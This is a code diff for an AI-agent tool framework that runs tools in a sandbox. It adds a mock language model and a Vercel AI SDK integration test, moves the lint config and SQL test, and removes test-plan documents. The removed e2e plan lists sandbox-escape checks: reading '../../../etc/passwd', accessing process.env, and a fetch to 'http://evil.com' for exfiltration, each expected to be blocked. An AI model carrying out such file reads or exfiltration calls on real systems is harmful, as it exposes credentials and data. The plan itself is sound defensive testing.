@@ -35,19 +35,18 @@ test/
   e2e/
     scenarios.test.ts
     utils.ts
+  fixtures/
+    fake-model.ts
   integration/
     bridge.test.ts
     gitops.test.ts
     sql.test.ts
+    vercel.test.ts
   unit/
     sandbox.test.ts
     utils.ts
     validation.test.ts
     vfs.test.ts
-test-docs/
-  e2e.test-plan.md
-  integration.test-plan.md
-  unit.test-plan.md
 eslint.config.js
 package.json
 README.md
@@ -55,6 +54,138 @@ tsconfig.json
 ```
 
 # Files
+
+## File: test/fixtures/fake-model.ts
+````typescript
+import { 
+  LanguageModelV1, 
+  LanguageModelV1CallResult, 
+  LanguageModelV1CallOptions 
+} from 'ai';
+
+/**
+ * A deterministic Mock LLM that implements the Vercel AI SDK LanguageModelV1 interface.
+ * Used to verify tool execution without network calls or spies.
+ */
+export class MockLanguageModelV1 implements LanguageModelV1 {
+  readonly specificationVersion = 'v1';
+  readonly provider = 'tgp-mock';
+  readonly modelId = 'mock-v1';
+  readonly defaultObjectGenerationMode = 'json';
+  
+  constructor(private queue: Array<(args: LanguageModelV1CallOptions) => LanguageModelV1CallResult>) {}
+
+  async doGenerate(options: LanguageModelV1CallOptions): Promise<LanguageModelV1CallResult> {
+    const next = this.queue.shift();
+    if (!next) {
+      throw new Error(`MockLanguageModelV1: Unexpected call to doGenerate. History: ${JSON.stringify(options.prompt, null, 2)}`);
+    }
+    return next(options);
+  }
+
+  async doStream(): Promise<any> {
+    throw new Error('MockLanguageModelV1: doStream is not implemented for this test.');
+  }
+}
+````
+
+## File: test/integration/vercel.test.ts
+````typescript
+import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
+import * as fs from 'fs/promises';
+import * as path from 'path';
+import { generateText } from 'ai';
+import { createTempDir, createTgpConfig, cleanupDir, initBareRepo } from '../e2e/utils.js';
+import { TGP } from '../../src/tgp.js';
+import { tgpTools } from '../../src/tools/index.js';
+import { MockLanguageModelV1 } from '../fixtures/fake-model.js';
+
+describe('Integration: Vercel AI SDK Compatibility', () => {
+  let tempDir: string;
+  let remoteRepo: string;
+
+  beforeEach(async () => {
+    tempDir = await createTempDir('tgp-int-vercel-');
+    remoteRepo = await createTempDir('tgp-remote-');
+    await initBareRepo(remoteRepo);
+  });
+
+  afterEach(async () => {
+    await cleanupDir(tempDir);
+    await cleanupDir(remoteRepo);
+  });
+
+  it('End-to-End: generateText executes TGP tools correctly', async () => {
+    // 1. Setup Kernel
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+
+    // 2. Prepare Toolset
+    const tools = tgpTools(kernel);
+
+    // 3. Setup Fake Model Interaction
+    // The interaction simulates:
+    // Turn 1: Model receives user prompt -> Calls 'write_file'
+    // Turn 2: Model receives tool result -> Returns final text
+    const mockModel = new MockLanguageModelV1([
+      // Response 1: Request Tool Execution
+      () => ({
+        rawCall: { raw: 'call' },
+        finishReason: 'tool-calls',
+        usage: { promptTokens: 10, completionTokens: 10 },
+        toolCalls: [
+          {
+            toolCallType: 'function',
+            toolCallId: 'call_1',
+            toolName: 'write_file',
+            // Vercel SDK expects args as a JSON string
+            args: JSON.stringify({ path: 'tools/hello-vercel.ts', content: 'export default "compat"' }),
+          }
+        ]
+      }),
+      // Response 2: Final Summary
+      (opts) => {
+        // Assert that the SDK fed the tool result back to the model
+        const lastMsg = opts.prompt[opts.prompt.length - 1];
+        if (lastMsg.role !== 'tool' || lastMsg.content[0].type !== 'tool-result') {
+          throw new Error('Expected last message to be a tool result');
+        }
+        
+        return {
+          rawCall: { raw: 'response' },
+          finishReason: 'stop',
+          usage: { promptTokens: 20, completionTokens: 5 },
+          text: 'File created successfully.'
+        };
+      }
+    ]);
+
+    // 4. Execute using Vercel AI SDK
+    const result = await generateText({
+      model: mockModel,
+      tools: tools, // Type Check: This must compile
+      maxSteps: 2,  // Allow tool roundtrips
+      prompt: 'Create a file named tools/hello-vercel.ts',
+    });
+
+    // 5. Verify Results
+    expect(result.text).toBe('File created successfully.');
+    expect(result.toolCalls.length).toBe(1);
+    expect(result.toolCalls[0].toolName).toBe('write_file');
+
+    // 6. Verify Side Effects (Real Filesystem Check)
+    // The VFS root is at .tgp inside tempDir (configured by createTgpConfig)
+    const targetFile = path.join(tempDir, '.tgp/tools/hello-vercel.ts');
+    const exists = await fs.access(targetFile).then(() => true).catch(() => false);
+    
+    expect(exists).toBe(true);
+    
+    const content = await fs.readFile(targetFile, 'utf-8');
+    expect(content).toBe('export default "compat"');
+  });
+});
+````
 
 ## File: bin/tgp.js
 ````javascript
@@ -78,12 +209,12 @@ import { ToolSet } from './tools/types.js';
  * Converts a TGP ToolSet into a format compatible with the Vercel AI SDK (Core).
  * 
  * @param tools The TGP ToolSet (from tgpTools(kernel))
- * @returns An object compatible with the `tools` parameter of `generateText`
+ * @returns An object structurally compatible with the `tools` parameter of `generateText`.
  */
 export function formatTools(tools: ToolSet) {
-  // Vercel AI SDK Core accepts tools as an object where keys are names
-  // and values have { description, parameters, execute }.
-  // TGP tools already match this signature largely, but we ensure strict typing here.
+  // TGP's AgentTool interface is designed to be structurally compatible 
+  // with Vercel AI SDK's CoreTool interface. 
+  // We return identity here, but explicit validation/adapter logic can be added if interfaces diverge.
   return tools;
 }
 
@@ -922,300 +1053,6 @@ describe('Unit: Sandbox Execution', () => {
 });
 ````
 
-## File: test-docs/e2e.test-plan.md
-````markdown
-# End-to-End Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Tests run against the built `bin/tgp.js` or the public API entry point using real dependencies (Git, SQLite, V8).
-2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
-3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-e2e-${uuid}`).
-4.  **Idempotent**: Tests can be re-run without manual cleanup (handled by isolation), and operations within tests should handle existing state gracefully.
-5.  **Clean on SIGTERM**: Test harness must ensure child processes and temp files are cleaned up if the test process is interrupted.
-
-## 1. The "Cold Start" Lifecycle (GitOps + Compilation)
-**Story**: An agent wakes up in a serverless environment, connects to a repo, builds a tool, uses it, and shuts down.
-
-1.  **Setup Environment**:
-    -   Create `bare-repo.git` (The Remote).
-    -   Create `config.ts` pointing to `bare-repo.git`.
-2.  **Agent Boot**:
-    -   Initialize TGP Kernel.
-    -   **Assert**: Local filesystem is clean (except for `.git` hydration).
-3.  **Task**: "Create a fibonacci tool".
-    -   Agent calls `write_file('tools/math/fib.ts', ...)` (Real TS code).
-    -   Agent calls `check_tool('tools/math/fib.ts')`. **Assert**: Valid.
-4.  **Execution**:
-    -   Agent calls `exec_tool('tools/math/fib.ts', { n: 10 })`.
-    -   **Assert**: Result is `55`.
-5.  **Shutdown & Persist**:
-    -   Kernel calls `sync()`.
-    -   Process exits.
-6.  **Verification (The "Next" Agent)**:
-    -   Clone `bare-repo.git` to a **new** directory.
-    -   Check file existence: `tools/math/fib.ts`.
-    -   **Assert**: File content matches exactly.
-
-## 2. Multi-Agent Concurrency (The "Merge" Test)
-**Story**: Two agents forge tools simultaneously. TGP must handle Git locking and merging without human intervention.
-
-1.  **Setup**:
-    -   Initialize `bare-repo.git`.
-    -   Instantiate **Agent A** in `dir_A` and **Agent B** in `dir_B` (both pointing to `bare-repo.git`).
-2.  **Parallel Action**:
-    -   Agent A creates `tools/math/add.ts`.
-    -   Agent B creates `tools/math/subtract.ts`.
-3.  **Race Condition**:
-    -   Agent A calls `sync()` (Push succeeds).
-    -   Agent B calls `sync()` immediately after.
-        -   **Expect**: Git push rejected (non-fast-forward).
-        -   **Auto-Resolution**: TGP kernel catches error, pulls (rebase/merge), and pushes again.
-4.  **Verification**:
-    -   Inspect `bare-repo.git` history.
-    -   **Assert**: Both `add.ts` and `subtract.ts` exist in HEAD.
-    -   **Assert**: Commit history is linear or cleanly merged.
-
-## 3. The "Refactor" Scenario (Search & Replace)
-**Story**: An existing tool is broken/outdated. Agent must patch it.
-
-1.  **Pre-condition**: `tools/legacy.ts` exists with `console.log("old")`.
-2.  **Agent Action**:
-    -   Agent reads file.
-    -   Agent calls `patch_file('tools/legacy.ts', ...)` to replace `console.log` with `return`.
-3.  **Verification**:
-    -   Run `exec_tool`.
-    -   **Assert**: Output is returned value, not undefined.
-    -   Read file from disk. **Assert**: Content is updated.
-    -   **Git Verify**: Change is staged/committed in local repo (if auto-commit is on).
-
-## 4. The "Infinite Loop" Self-Defense (Resilience)
-**Story**: Agent generates malicious/buggy code that freezes.
-
-1.  **Action**: Agent creates `tools/freeze.ts` (`while(true){}`).
-2.  **Execution**: Agent calls `exec_tool('tools/freeze.ts')`.
-3.  **Observation**:
-    -   Function call throws exception `ERR_ISOLATE_TIMEOUT`.
-    -   Exception is caught by Kernel.
-    -   **Assert**: Main process (The Agent) remains alive and responsive.
-    -   **Assert**: Memory usage of Main process is stable (V8 isolate disposed).
-
-## 5. Security & Sandbox Jailbreak
-**Story**: Malicious tool attempts to access host resources.
-
-1.  **Filesystem Escape**:
-    -   Create tool `tools/hack.ts` attempting `read_file('../../../etc/passwd')`.
-    -   Execute. **Assert**: Throws `SecurityViolation`.
-2.  **Environment Theft**:
-    -   Create tool `tools/env.ts` attempting to access `process.env`.
-    -   Execute. **Assert**: Throws `ReferenceError` (process is not defined).
-3.  **Network Exfiltration**:
-    -   Create tool `tools/curl.ts` attempting `fetch('http://evil.com')`.
-    -   Execute. **Assert**: Throws `NetworkError` or `SecurityViolation` (not in whitelist).
-
-## 6. Database Transaction Safety (SQL)
-**Story**: A tool performs SQL operations. Logic error triggers rollback.
-
-1.  **Setup**:
-    -   Initialize real SQLite DB `test.db` with table `logs`.
-2.  **Success Path**:
-    -   Tool executes `INSERT INTO logs VALUES ('ok')`.
-    -   **Assert**: Row count = 1.
-3.  **Failure Path (Rollback)**:
-    -   Tool executes:
-        ```typescript
-        sql('INSERT INTO logs VALUES ("bad")');
-        throw new Error("Logic Crash");
-        ```
-    -   Kernel catches error.
-    -   **Assert**: Row count = 1 (The "bad" row was rolled back).
-
-## 7. The "SIGTERM" Cleanliness Test
-**Story**: Deployment platform kills the pod while tool is running.
-
-1.  **Setup**:
-    -   Start TGP process that writes to a database loop or holds a file lock.
-2.  **Action**:
-    -   Send `SIGTERM` to process.
-3.  **Verification**:
-    -   Check Database locks. **Assert**: Released (WAL file clean).
-    -   Check Temporary Files (`/tmp/tgp-*`). **Assert**: Deleted/Cleaned up.
-    -   Check Git Lock files (`index.lock`). **Assert**: Cleared.
-
-## 8. CLI Bootstrap Test
-**Story**: Developer initializes project.
-
-1.  **Action**: Exec `node bin/tgp.js init` in empty dir.
-2.  **Assert**:
-    -   `tgp.config.ts` created.
-    -   `.tgp` folder structure created.
-    -   `package.json` updated (if applicable).
-    -   Run `node bin/tgp.js check`. **Assert**: Passes with no tools.
-````
-
-## File: test-docs/integration.test-plan.md
-````markdown
-# Integration Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Tests use real Git binaries, real SQLite drivers, and real V8 isolates.
-2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
-3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-integration-${uuid}`).
-4.  **Idempotent**: Tests can be re-run without manual cleanup.
-5.  **Clean on SIGTERM**: Test harness cleans up temp files if interrupted.
-
-## 1. GitOps & Persistence
-**Target**: `src/kernel/git.ts`
-**Setup**:
-1.  Create `REMOTE_DIR` (init bare repo).
-2.  Create `AGENT_DIR` (configured as TGP root).
-
-- [ ] **Hydration (Clone/Pull)**
-    - [ ] Commit a tool `tools/hello.ts` to `REMOTE_DIR` using standard `git` CLI commands.
-    - [ ] Initialize `TGP Kernel` in `AGENT_DIR`.
-    - [ ] **Assert**: `tools/hello.ts` exists in `AGENT_DIR` and is readable.
-- [ ] **Fabrication (Commit/Push)**
-    - [ ] Use Kernel to write `tools/new.ts` in `AGENT_DIR`.
-    - [ ] Trigger Kernel persistence (sync).
-    - [ ] Verify in `REMOTE_DIR` (using `git log`) that a new commit exists with the expected message.
-- [ ] **Concurrency (Locking)**
-    - [ ] Instantiate **two** Kernels pointing to the same `REMOTE_DIR` but different local dirs.
-    - [ ] Agent A writes `toolA.ts`. Agent B writes `toolB.ts`.
-    - [ ] Both sync simultaneously.
-    - [ ] **Assert**: `REMOTE_DIR` contains both files. No merge conflicts (assuming distinct files).
-
-## 2. Kernel <-> Sandbox Bridge
-**Target**: `src/sandbox/bridge.ts`
-
-- [ ] **Host Filesystem Access**
-    - [ ] Create file `data.json` in Host VFS.
-    - [ ] Create tool that uses `tgp.read_file('data.json')`.
-    - [ ] Execute tool.
-    - [ ] **Assert**: Tool returns parsed JSON.
-- [ ] **Recursive Tool Execution**
-    - [ ] Create `tools/multiplier.ts` (returns `a * b`).
-    - [ ] Create `tools/calculator.ts` that imports/calls `multiplier`.
-    - [ ] Execute `calculator`.
-    - [ ] **Assert**: Returns correct result. Verifies internal module resolution works in V8.
-
-## 3. SQL Adapter (Real SQLite)
-**Target**: `src/tools/sql.ts`
-**Setup**: Create `test.db` (SQLite). Run migration to create table `users`.
-
-- [ ] **Query Execution**
-    - [ ] Tool executes `SELECT * FROM users`.
-    - [ ] **Assert**: Returns real rows.
-- [ ] **Transaction Rollback**
-    - [ ] Tool executes:
-        1. `INSERT INTO users ...`
-        2. `throw new Error('Boom')`
-    - [ ] Catch error in test.
-    - [ ] Query `users` table.
-    - [ ] **Assert**: Count is 0 (Rollback successful).
-````
-
-## File: test-docs/unit.test-plan.md
-````markdown
-# Unit Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Use real file systems (node:fs), real V8 isolates (isolated-vm).
-2.  **Real Implementation**: Verify logic by observing real output/exceptions.
-3.  **Isolated**: Each test suite creates a unique temporary directory (`/tmp/tgp-unit-${uuid}`).
-4.  **Idempotent**: No shared global state between tests.
-5.  **Clean on SIGTERM**: Register `process.on('SIGTERM')` handlers to wipe temp dirs.
-
-## 1. VFS (Virtual Filesystem) - Node Adapter
-**Target**: `src/vfs/node.ts`
-**Setup**: Create a temporary directory `TEST_ROOT`.
-
-- [ ] **Real I/O Operations**
-    - [ ] `write('deep/nested/file.txt')`: Verify it creates physical directories on disk.
-    - [ ] `read('deep/nested/file.txt')`: Verify it returns exact byte content written.
-    - [ ] `list('deep')`: Verify it returns structure matching OS `ls -R`.
-- [ ] **Path Security (Jail)**
-    - [ ] Attempt `write('../outside.txt')`. **Assert**: Throws specific `SecurityViolation` error. File **must not** exist outside `TEST_ROOT`.
-    - [ ] Attempt symlink traversal. Create a symlink in `TEST_ROOT` pointing to `/etc/passwd`. Attempt `read()`. **Assert**: Throws or resolves to empty/null (depending on config).
-
-## 2. Sandbox Execution (V8)
-**Target**: `src/sandbox/isolate.ts`, `src/sandbox/bundler.ts`
-**Setup**: Instantiate real `isolated-vm`.
-
-- [ ] **Compilation**
-    - [ ] Feed raw TypeScript: `export default (a: number) => a * 2;`.
-    - [ ] **Assert**: Returns a callable function handle.
-    - [ ] Feed Syntax Error: `const x = ;`.
-    - [ ] **Assert**: Throws `CompilationError` with line number.
-- [ ] **Runtime constraints**
-    - [ ] **Memory**: Execute script that allocates 100MB buffer. **Assert**: Throws `ERR_ISOLATE_MEMORY`.
-    - [ ] **Timeout**: Execute `while(true){}`. **Assert**: Throws `ERR_ISOLATE_TIMEOUT` after 50ms (or configured limit).
-- [ ] **Determinism**
-    - [ ] Run `Math.random()`. **Assert**: If seed is configurable, output is constant. (If not, verify output format).
-
-## 3. Tool Validation logic
-**Target**: `src/tools/validation.ts`
-
-- [ ] **Static Analysis**
-    - [ ] Input source code with `process.exit()`.
-    - [ ] **Assert**: Validation fails with "Global 'process' is forbidden".
-    - [ ] Input source code with `import fs from 'fs'`.
-    - [ ] **Assert**: Validation fails if import is not in whitelist.
-````
-
-## File: eslint.config.js
-````javascript
-import typescriptESLint from '@typescript-eslint/eslint-plugin';
-import typescriptParser from '@typescript-eslint/parser';
-
-export default [
-  {
-    files: ['src/**/*.ts', 'test/**/*.ts'],
-    languageOptions: {
-      parser: typescriptParser,
-      parserOptions: {
-        ecmaVersion: 2022,
-        sourceType: 'module',
-        project: './tsconfig.json',
-      },
-      globals: {
-        console: 'readonly',
-        process: 'readonly',
-        Buffer: 'readonly',
-        __dirname: 'readonly',
-        __filename: 'readonly',
-        global: 'readonly',
-        describe: 'readonly',
-        it: 'readonly',
-        expect: 'readonly',
-        beforeEach: 'readonly',
-        afterEach: 'readonly',
-      },
-    },
-    plugins: {
-      '@typescript-eslint': typescriptESLint,
-    },
-    rules: {
-      '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
-      '@typescript-eslint/no-explicit-any': 'warn',
-      '@typescript-eslint/no-non-null-assertion': 'warn',
-      '@typescript-eslint/no-empty-function': 'error',
-      '@typescript-eslint/no-unnecessary-type-assertion': 'error',
-      '@typescript-eslint/prefer-as-const': 'error',
-      '@typescript-eslint/prefer-nullish-coalescing': 'error',
-      '@typescript-eslint/prefer-optional-chain': 'error',
-      '@typescript-eslint/strict-boolean-expressions': 'error',
-      'no-console': 'warn',
-      'no-debugger': 'error',
-      'no-unused-expressions': 'error',
-      'prefer-const': 'error',
-      'no-var': 'error',
-    },
-  },
-  {
-    ignores: ['dist/', 'node_modules/', '*.js'],
-  },
-];
-````
-
 ## File: src/tools/fs.ts
 ````typescript
 import { z } from 'zod';
@@ -1438,184 +1275,60 @@ export function createNodeVFS(rootDir: string): VFSAdapter {
 }
 ````
 
-## File: test/integration/sql.test.ts
-````typescript
-import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
-import { createTempDir, createTgpConfig, cleanupDir, initBareRepo } from '../e2e/utils.js';
-import { TGP } from '../../src/tgp.js';
-import { tgpTools, createSqlTools } from '../../src/tools/index.js';
+## File: eslint.config.js
+````javascript
+import typescriptESLint from '@typescript-eslint/eslint-plugin';
+import typescriptParser from '@typescript-eslint/parser';
 
-// Abstraction for DB differences between Node (better-sqlite3) and Bun (bun:sqlite)
-// This ensures tests run natively in Bun without 'better-sqlite3' ABI issues,
-// while maintaining Node compatibility.
-interface TestDB {
-  exec(sql: string): void;
-  prepare(sql: string): {
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    all(...params: any[]): any[];
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    get(...params: any[]): any;
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    run(...params: any[]): any;
-  };
-  close(): void;
-}
-
-async function createTestDB(): Promise<TestDB> {
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const isBun = typeof process !== 'undefined' && (process.versions as any).bun;
-
-  if (isBun) {
-    // Dynamic import to avoid build-time errors/resolutions in Node
-    const { Database } = await import('bun:sqlite'); 
-    const db = new Database(':memory:');
-    return {
-      exec: (sql: string) => db.run(sql),
-      prepare: (sql: string) => {
-        const query = db.query(sql);
-        return {
-          all: (...params: any[]) => query.all(...params),
-          get: (...params: any[]) => query.get(...params),
-          run: (...params: any[]) => query.run(...params),
-        };
+export default [
+  {
+    files: ['src/**/*.ts', 'test/**/*.ts'],
+    languageOptions: {
+      parser: typescriptParser,
+      parserOptions: {
+        ecmaVersion: 2022,
+        sourceType: 'module',
+        project: './tsconfig.json',
       },
-      close: () => db.close(),
-    };
-  } else {
-    const { default: Database } = await import('better-sqlite3');
-    const db = new Database(':memory:');
-    return {
-      exec: (sql: string) => db.exec(sql),
-      prepare: (sql: string) => {
-        const stmt = db.prepare(sql);
-        return {
-          all: (...params: any[]) => stmt.all(...params),
-          get: (...params: any[]) => stmt.get(...params),
-          run: (...params: any[]) => stmt.run(...params),
-        };
+      globals: {
+        console: 'readonly',
+        Bun: 'readonly',
+        process: 'readonly',
+        Buffer: 'readonly',
+        __dirname: 'readonly',
+        __filename: 'readonly',
+        global: 'readonly',
+        describe: 'readonly',
+        it: 'readonly',
+        expect: 'readonly',
+        beforeEach: 'readonly',
+        afterEach: 'readonly',
       },
-      close: () => db.close(),
-    };
-  }
-}
-
-describe('Integration: SQL Adapter (Real SQLite)', () => {
-  let tempDir: string;
-  let remoteRepo: string;
-  let db: TestDB;
-
-  beforeEach(async () => {
-    tempDir = await createTempDir('tgp-int-sql-');
-    remoteRepo = await createTempDir('tgp-remote-');
-    await initBareRepo(remoteRepo);
-    
-    // Setup Real SQLite DB (In-memory for speed/isolation)
-    db = await createTestDB();
-    db.exec('CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)');
-    db.exec("INSERT INTO users (name) VALUES ('Alice')");
-    db.exec("INSERT INTO users (name) VALUES ('Bob')");
-  });
-
-  afterEach(async () => {
-    if (db) db.close();
-    await cleanupDir(tempDir);
-    await cleanupDir(remoteRepo);
-  });
-
-  it('Query Execution: Tool can query real database', async () => {
-    const configPath = await createTgpConfig(tempDir, remoteRepo);
-    
-    // Executor that bridges TGP -> Real DB
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    const executor = async (sql: string, params: any[]) => {
-      const stmt = db.prepare(sql);
-      if (sql.trim().toLowerCase().startsWith('select')) {
-        return stmt.all(...params);
-      }
-      return stmt.run(...params);
-    };
-
-    const kernel = new TGP({ 
-      configFile: configPath,
-      sandboxAPI: { exec_sql: executor } // Inject for internal usage if needed
-    });
-    await kernel.boot();
-
-    // Compose tools
-    const tools = { ...tgpTools(kernel), ...createSqlTools(executor) };
-
-    const toolName = 'tools/get_users.ts';
-    await tools.write_file.execute({
-      path: toolName,
-      content: `
-        export default async function() {
-          return await tgp.exec_sql('SELECT name FROM users ORDER BY name', []);
-        }
-      `
-    });
-
-    const res = await tools.exec_tool.execute({ path: toolName, args: {} });
-    
-    expect(res.success).toBe(true);
-    expect(res.result).toEqual([{ name: 'Alice' }, { name: 'Bob' }]);
-  });
-
-  it('Transaction Rollback: Host can rollback if tool throws', async () => {
-    const configPath = await createTgpConfig(tempDir, remoteRepo);
-    
-    // Executor
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    const executor = async (sql: string, params: any[]) => {
-      return db.prepare(sql).run(...params);
-    };
-
-    const kernel = new TGP({ configFile: configPath });
-    await kernel.boot();
-    const tools = { ...tgpTools(kernel), ...createSqlTools(executor) };
-
-    // Create a buggy tool that writes then crashes
-    const buggyTool = 'tools/buggy_insert.ts';
-    await tools.write_file.execute({
-      path: buggyTool,
-      content: `
-        export default async function() {
-           // 1. Write
-           await tgp.exec_sql("INSERT INTO users (name) VALUES ('Charlie')", []);
-           // 2. Crash
-           throw new Error('Logic Bomb');
-        }
-      `
-    });
-
-    // Emulate Host Application Transaction Wrapper
-    // Since we manage transaction via raw SQL commands
-    // surrounding the async tool execution.
-    
-    db.exec('BEGIN');
-    let errorCaught = false;
-    
-    try {
-      const res = await tools.exec_tool.execute({ path: buggyTool, args: {} });
-      if (!res.success) {
-        throw new Error(res.error);
-      }
-      db.exec('COMMIT');
-    } catch (e) {
-      errorCaught = true;
-      db.exec('ROLLBACK');
-    }
-
-    expect(errorCaught).toBe(true);
-
-    // Verify 'Charlie' was NOT added
-    const rows = db.prepare('SELECT * FROM users WHERE name = ?').all('Charlie');
-    expect(rows.length).toBe(0);
-    
-    // Verify existing data remains
-    const count = db.prepare('SELECT count(*) as c FROM users').get() as { c: number };
-    expect(count.c).toBe(2);
-  });
-});
+    },
+    plugins: {
+      '@typescript-eslint': typescriptESLint,
+    },
+    rules: {
+      '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
+      '@typescript-eslint/no-explicit-any': 'warn',
+      '@typescript-eslint/no-non-null-assertion': 'warn',
+      '@typescript-eslint/no-empty-function': 'error',
+      '@typescript-eslint/no-unnecessary-type-assertion': 'error',
+      '@typescript-eslint/prefer-as-const': 'error',
+      '@typescript-eslint/prefer-nullish-coalescing': 'error',
+      '@typescript-eslint/prefer-optional-chain': 'error',
+      '@typescript-eslint/strict-boolean-expressions': 'error',
+      'no-console': 'warn',
+      'no-debugger': 'error',
+      'no-unused-expressions': 'error',
+      'prefer-const': 'error',
+      'no-var': 'error',
+    },
+  },
+  {
+    ignores: ['dist/', 'node_modules/', '*.js'],
+  },
+];
 ````
 
 ## File: src/tools/exec.ts
@@ -1826,6 +1539,426 @@ process.on('exit', () => {
     "declaration": true
   },
   "include": ["src/**/*", "test/**/*"]
+}
+````
+
+## File: test/integration/sql.test.ts
+````typescript
+import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
+import { createTempDir, createTgpConfig, cleanupDir, initBareRepo } from '../e2e/utils.js';
+import { TGP } from '../../src/tgp.js';
+import { tgpTools, createSqlTools } from '../../src/tools/index.js';
+
+// Abstraction for DB differences between Node (better-sqlite3) and Bun (bun:sqlite)
+// This ensures tests run natively in Bun without 'better-sqlite3' ABI issues,
+// while maintaining Node compatibility.
+interface TestDB {
+  exec(sql: string): void;
+  prepare(sql: string): {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    all(...params: any[]): any[];
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    get(...params: any[]): any;
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    run(...params: any[]): any;
+  };
+  close(): void;
+}
+
+async function createTestDB(): Promise<TestDB> {
+  const isBun = typeof Bun !== 'undefined';
+
+  if (isBun) {
+    // Dynamic import to avoid build-time errors/resolutions in Node
+    const { Database } = await import('bun:sqlite'); 
+    const db = new Database(':memory:');
+    return {
+      exec: (sql: string) => db.run(sql),
+      prepare: (sql: string) => {
+        const query = db.query(sql);
+        return {
+          all: (...params: any[]) => query.all(...params),
+          get: (...params: any[]) => query.get(...params),
+          run: (...params: any[]) => query.run(...params),
+        };
+      },
+      close: () => db.close(),
+    };
+  } else {
+    const { default: Database } = await import('better-sqlite3');
+    const db = new Database(':memory:');
+    return {
+      exec: (sql: string) => db.exec(sql),
+      prepare: (sql: string) => {
+        const stmt = db.prepare(sql);
+        return {
+          all: (...params: any[]) => stmt.all(...params),
+          get: (...params: any[]) => stmt.get(...params),
+          run: (...params: any[]) => stmt.run(...params),
+        };
+      },
+      close: () => db.close(),
+    };
+  }
+}
+
+describe('Integration: SQL Adapter (Real SQLite)', () => {
+  let tempDir: string;
+  let remoteRepo: string;
+  let db: TestDB;
+
+  beforeEach(async () => {
+    tempDir = await createTempDir('tgp-int-sql-');
+    remoteRepo = await createTempDir('tgp-remote-');
+    await initBareRepo(remoteRepo);
+    
+    // Setup Real SQLite DB (In-memory for speed/isolation)
+    db = await createTestDB();
+    db.exec('CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)');
+    db.exec("INSERT INTO users (name) VALUES ('Alice')");
+    db.exec("INSERT INTO users (name) VALUES ('Bob')");
+  });
+
+  afterEach(async () => {
+    if (db) db.close();
+    await cleanupDir(tempDir);
+    await cleanupDir(remoteRepo);
+  });
+
+  it('Query Execution: Tool can query real database', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    
+    // Executor that bridges TGP -> Real DB
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const executor = async (sql: string, params: any[]) => {
+      const stmt = db.prepare(sql);
+      if (sql.trim().toLowerCase().startsWith('select')) {
+        return stmt.all(...params);
+      }
+      return stmt.run(...params);
+    };
+
+    const kernel = new TGP({ 
+      configFile: configPath,
+      sandboxAPI: { exec_sql: executor } // Inject for internal usage if needed
+    });
+    await kernel.boot();
+
+    // Compose tools
+    const tools = { ...tgpTools(kernel), ...createSqlTools(executor) };
+
+    const toolName = 'tools/get_users.ts';
+    await tools.write_file.execute({
+      path: toolName,
+      content: `
+        export default async function() {
+          return await tgp.exec_sql('SELECT name FROM users ORDER BY name', []);
+        }
+      `
+    });
+
+    const res = await tools.exec_tool.execute({ path: toolName, args: {} });
+    
+    expect(res.success).toBe(true);
+    expect(res.result).toEqual([{ name: 'Alice' }, { name: 'Bob' }]);
+  });
+
+  it('Transaction Rollback: Host can rollback if tool throws', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    
+    // Executor
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const executor = async (sql: string, params: any[]) => {
+      return db.prepare(sql).run(...params);
+    };
+
+    const kernel = new TGP({
+      configFile: configPath,
+      sandboxAPI: { exec_sql: executor }
+    });
+    await kernel.boot();
+    const tools = { ...tgpTools(kernel), ...createSqlTools(executor) };
+
+    // Create a buggy tool that writes then crashes
+    const buggyTool = 'tools/buggy_insert.ts';
+    await tools.write_file.execute({
+      path: buggyTool,
+      content: `
+        export default async function() {
+           // 1. Write
+           await tgp.exec_sql("INSERT INTO users (name) VALUES ('Charlie')", []);
+           // 2. Crash
+           throw new Error('Logic Bomb');
+        }
+      `
+    });
+
+    // Emulate Host Application Transaction Wrapper
+    // Since we manage transaction via raw SQL commands
+    // surrounding the async tool execution.
+    
+    db.exec('BEGIN');
+    let errorCaught = false;
+    
+    try {
+      const res = await tools.exec_tool.execute({ path: buggyTool, args: {} });
+      if (!res.success) {
+        throw new Error(res.error);
+      }
+      db.exec('COMMIT');
+    } catch (e) {
+      errorCaught = true;
+      db.exec('ROLLBACK');
+    }
+
+    expect(errorCaught).toBe(true);
+
+    // Verify 'Charlie' was NOT added
+    const rows = db.prepare('SELECT * FROM users WHERE name = ?').all('Charlie');
+    expect(rows.length).toBe(0);
+    
+    // Verify existing data remains
+    const count = db.prepare('SELECT count(*) as c FROM users').get() as { c: number };
+    expect(count.c).toBe(2);
+  });
+});
+````
+
+## File: src/cli/init.ts
+````typescript
+/* eslint-disable no-console */
+import * as fs from 'fs/promises';
+import * as path from 'path';
+
+export async function initCommand() {
+  const cwd = process.cwd();
+  console.log(`[TGP] Initializing in ${cwd}...`);
+
+  const configPath = path.join(cwd, 'tgp.config.ts');
